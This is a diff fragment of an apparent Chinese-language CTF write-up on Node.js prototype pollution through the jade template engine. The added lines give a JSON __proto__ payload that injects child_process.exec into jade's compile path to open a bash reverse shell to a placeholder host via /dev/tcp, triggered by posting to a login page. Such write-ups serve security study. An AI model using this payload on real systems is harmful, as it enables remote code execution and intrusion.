@@ -173,4 +173,8 @@ req.body是入口，user.userinfo我们要通过这个污染Object,`userinfo` �
 
 ^
 #### **jade原型链污染**
+package.json中存在jade。
 在login页面打上去之后随便访问下，就会反弹。
+```
+{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/810>&1\"')"}}}
+```
